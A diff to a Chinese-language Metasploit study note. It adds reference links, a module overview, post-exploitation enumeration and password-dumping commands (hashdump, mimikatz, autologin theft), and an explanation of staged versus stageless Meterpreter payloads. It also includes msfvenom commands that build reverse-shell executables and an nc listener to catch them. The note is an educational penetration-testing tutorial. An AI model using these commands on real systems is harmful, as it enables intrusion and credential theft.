@@ -4,6 +4,8 @@
     <img src="../../../assets/img/logo/metasploit.png" width="20%">
 </p>
 
+> 注 : 笔记中拓扑图 xmind 源文件在其图片目录下
+
 ---
 
 ## 免责声明
@@ -18,6 +20,10 @@
 **文章 & Reference**
 - [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
 - [[渗透神器系列]Metasploit](https://thief.one/2017/08/01/1/)
+- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
+- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
+- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
+- [探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)
 
 **图形化 UI**
 - [WayzDev/Kage](https://github.com/WayzDev/Kage)
@@ -34,6 +40,14 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 ```
 
 安装完成后位置 `/opt/metasploit-framework/embedded/framework/`
+
+**框架组成**
+
+Metasploit 主要包含了以下几个功能模块
+- msfconsole：整个框架最基本的模块，所有的功能都可以该模块下运行。
+- msfvenom：代替了 msfpayload 和 msfencode 的功能，效率更高。
+- msfupdate：用于软件更新，更新漏洞库和利用代码。
+- msfweb：Metasploit Framework 的 web 组件，支持多用户，是 Metasploit 图形化接口。
 
 **目录结构**
 ```bash
@@ -64,7 +78,7 @@ db_status           # 查看数据库连接情况
 对于 kali 自带的 msf 可以使用 apt 更新
 ```bash
 apt-get update
-apt-get install metasploit-framework
+apt-get install -y metasploit-framework
 ```
 
 嫌官方源速度慢可以添加阿里云的源
@@ -230,11 +244,15 @@ run post/windows/gather/enum_ie                         # 获取 IE 缓存
 run post/windows/gather/enum_chrome                     # 获取 Chrome 缓存
 run post/windows/gather/enum_patches                    # 补丁信息
 run post/windows/gather/enum_domain                     # 查找域控
+
+run post/linux/busybox/enum_hosts                       # 读取/var/hosts
+run post/windows/gather/enum_hostfile                   # 读取 %windir%\system32\drivers\etc\hosts
 ```
 
 **抓取密码**
 ```bash
 run hashdump                        # 获取用户密码 hash 值
+
 load mimikatz                       # 加载 mimikatz,用于抓取密码,不限于明文密码和 hash 值;
 msv                                 # 获取的是 hash 值
 ssp                                 # 获取的是明文信息
@@ -243,6 +261,9 @@ wdigest                             # 读取内存中存放的账号密码明文
 mimikatz_command -f samdump::hashes # 获取用户 hash
 mimikatz_command -f handle::list    # 列出应用进程
 mimikatz_command -f service::list   # 列出服务
+
+run windows/gather/credentials/windows_autologin    # 抓取自动登录的用户名和密码
+run windows/gather/smart_hashdump
 
 或
 
@@ -423,7 +444,7 @@ exploit
 **网络命令**
 ```bash
 Ipconfig/ifconfig                   # 查看目标主机 IP 地址;
-arp –a                              # 用于查看高速缓存中的所有项目;
+arp -a                              # 用于查看高速缓存中的所有项目;
 route                               # 打印路由信息;
 netstat -na                         # 可以显示所有连接的端口
 ```
@@ -618,7 +639,65 @@ timestomp -v secist.txt
 
 ---
 
-**Source & Reference**
-- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
-- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
-- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
+# stage 和 stageless 的区别
+
+> 以下部分内容来自 <sup>[探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)</sup>
+
+在 MSF 里有很相似的 metasploit payload,比如
+```
+payload/windows/x64/meterpreter/reverse_tcp  normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+payload/windows/x64/meterpreter_reverse_tcp  normal  No  Windows Meterpreter Shell, Reverse TCP Inline x64
+```
+
+这2者有什么关系呢?以 08067 模块的利用为例
+
+**Stage**
+
+- bootstrap(starger) : shellcode
+- metserv : Meterpreter 核心文件
+- stdapi : 计算机文件、系统、网络等属性的访问
+- priv : 权限提升、转储密码 hash 和本地提权
+
+当我们使用 metasplit 的 ms08_067_netapi 模块之后，使用 payload/windows/meterpreter/reverse_tcp 模块，并开启一个 multi/handler 连接监听着我们本机的 4444 端口，有了解过缓冲区溢出的同学可能都知道，攻击者会利用软件的某个缺陷来传输一段很长的 shellcode 来溢出目标的缓冲区，从而控制 EIP 指针来跳转到我们的 shellcode 上，执行我们的代码，但是这段 shellcode 并不能过长，shellcode 过长，可能会导致覆盖到了上一函数栈帧的数据，导致异常的发生。所以像我们攻击者最希望就是生成一段短小精悍的 shellcode
+
+![](../../../assets/img/Security/安全工具/Metasploit/1.png)
+
+像下面这张图，我们攻击机像目标靶机发送了一段 shellcode，并覆盖了 EIP，导致程序执行的时候跳回 shellcode 的开头，从而控制程序的执行情况，执行我们的恶意代码，这段恶意代码就只要干两件事，第一件事就是向内存申请开辟一块空间，第二件事就是回连我们的 4444 端口，这段 shellcode 为我们干的事情就好像是一个前排冲锋的战士，打开城墙的大门好让更多的精兵冲进来。我们称这段 shellcode 为 stage0，也就是第一阶段
+
+![](../../../assets/img/Security/安全工具/Metasploit/2.png)
+
+这时，我们的攻击机，已经开始监听 4444 端口了，只要连接一成功，就会把 meterpreter shell 最核心的 dll 文件发送到靶机上
+
+![](../../../assets/img/Security/安全工具/Metasploit/3.png)
+
+我们之前说过，当靶机运行了我们的 shellcode，会在内存里面开辟一块土地，这个地方就是为我们的 metsrv 留的，metsrv.dll 这个文件是 meterpreter 的核心组件，有了他，我们才能获取到一个 meterpreter shell，当 metsrv 传输成功之后，shellcode 就会把控制权转给 metsrv，metsrv 这时再去请求另外两个 dll 文件 stdapi 和 priv。这个时候目标就上线了.
+
+![](../../../assets/img/Security/安全工具/Metasploit/4.png)
+
+**Stageless**
+
+现在我们知道了 meterpreter/reverse_tcp 是分阶段的 shellcode，并且他分阶段的原因是因为在溢出攻击的时候 shellcode 应该尽可能保持得更短，这个时候理解他小兄弟 meterpreter_reverse_tcp 就方便的多，和 meterpreter/reverse_tcp 不同的是，他的小兄弟 meterpreter_reverse_tcp 是一个不分阶段的 payload，我们称之为 stageless(unstage)，他在生成的时候就已经将我们获取一个 meterpreter 必须要用的 stdapi 已经包含在其中了。那这又有什么好处呢？试想一下，如果我们通过层层的代理，在内网进行漫游，这个时候使用分阶段的 payload 如果网络传输出现了问题，metsrv.dll 没有加载过去，可能就会错失一个 shell，stageless 的 payload 会让人放心不少
+
+默认的 stageless payload 只会包含 stageless，所以如果想将 stdapi 和 priv 两个组件给包含进去的话我们可以用 extensions 命令：
+```bash
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
+```
+
+**回弹至 nc**
+
+分阶段的 payload，我们必须使用 exploit/multi/handler 这个模块使用，但是当我们想回弹一个基础的 shell 的时候，其实可以使用 nc 来监听端口直接回连到 nc 上
+
+当有时获取到了 root 权限，想反弹 linux shell 的时候，这时 meterprter 的需求就不是那么高了，我们就可以使用 shell_reverse_tcp(或者是 bind) 来生成一个 stageless 的 bash 脚本，直接使用 nc 来接受 shell
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.141.143 LPORT=4444 -f exe > ./vu.exe
+```
+
+nc 监听
+```bash
+nc -tvlp 4444
+```
+
+接收回弹
+
+![](../../../assets/img/Security/安全工具/Metasploit/5.png)
